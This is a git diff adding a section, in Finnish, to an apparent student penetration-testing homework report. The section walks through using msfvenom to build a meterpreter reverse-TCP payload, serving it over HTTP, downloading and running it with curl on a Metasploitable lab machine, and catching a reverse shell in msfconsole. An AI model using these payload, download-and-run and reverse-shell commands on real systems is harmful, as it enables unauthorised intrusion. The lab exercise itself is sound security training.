@@ -158,6 +158,41 @@ Lopuksi ajoin komennon ``sudo john --wordlist=/usr/share/wordlists/sanalista.txt
 
 
 ## f) Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin
+
+Löysin Youtubesta ohjevideon ja hyödynnän sitä tätä tehtävää tehdessä. Video merkattu lähteisiin. 
+
+Kun koneiden yhteys on varmistettu, syötin komennon ``msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.88.5 lport=5555 -f elf > reverse.elf``. 
+
+![image](https://github.com/user-attachments/assets/1fe7e66a-6a4c-40eb-bc10-9f109b3c9a10)
+
+Tämän jälkeen komento ``python3 -m http.server``. Se käynnistää Web serverin porttiin 8000 ja pyörittää juuri luomaa haittaohjelmaa. 
+
+![image](https://github.com/user-attachments/assets/ee18d8e3-2bcc-4158-b6a8-ba63f644d1f4)
+
+Tämän jälkeen avataan uusi terminaali ja avataan msfconsole ja ajetaan komento ``use exploit/multi/handler``.
+
+![image](https://github.com/user-attachments/assets/472b2d67-cb84-4d4c-9d38-1d2fbfb863dc)
+
+Tämän jälkeen on aika asettaa payload komennolla ``set payload linux/x86/meterpreter/reverse_tcp``. 
+
+![image](https://github.com/user-attachments/assets/7723fcf1-f9fa-453e-b132-bd1aae00f08b)
+
+Tämän jälkeen määrittele lhost ja anna sille Kalin IP-osoite. Kuuntelevaksi portiksi tulee 5555. Sitten komento ``exploit`` ja yhteys syntyy. 
+
+![image](https://github.com/user-attachments/assets/80dfd6d2-073a-4dda-b706-7c191e901fc3)
+
+Siirrytään Metasploitablen puolelle. Ja annetaan komento ``curl -o reverse.elf 192.168.88.5:8000/reverse.elf``. 
+
+![image](https://github.com/user-attachments/assets/7858f94e-3507-4bf5-8575-535401550ed6)
+
+Lopuksi annetaan oikeat oikeudet ja ajetaan ohjelma.
+
+![image](https://github.com/user-attachments/assets/3817f981-14db-4554-9984-26b1fc263470)
+
+Ja BOOM!! Reverse shell yhteys Metasploitableen on auki.
+
+![image](https://github.com/user-attachments/assets/2954362a-8731-4d0d-9e66-b58a04eec067)
+
 # Lähteet
 Karvinen, T. 2024. Tunkeutumistestaus - Penetration Testing course - 2024 late autumn. Saatavilla: https://terokarvinen.com/tunkeutumistestaus/
 
@@ -174,3 +209,5 @@ HackTricks. 2024. MSFVenom - CheatSheet. Saatavilla:  https://book.hacktricks.xy
 Karvinen, T. 2023. Fuffme - Install Web Fuzzing Target on Debian. Saatavilla: https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/
 
 G MAN : Security. 2024. CRACK the Password | JOHN the Ripper Password Cracking ( 5 minutes). Saatavilla: https://www.youtube.com/watch?v=5MLprTAxYDA&t=10s
+
+CyberOffence. 2022. Use Msfvenom to Create Reverse TCP Payload - Youtube. Saatavilla: https://www.youtube.com/watch?v=ZqWfDrD2WVY
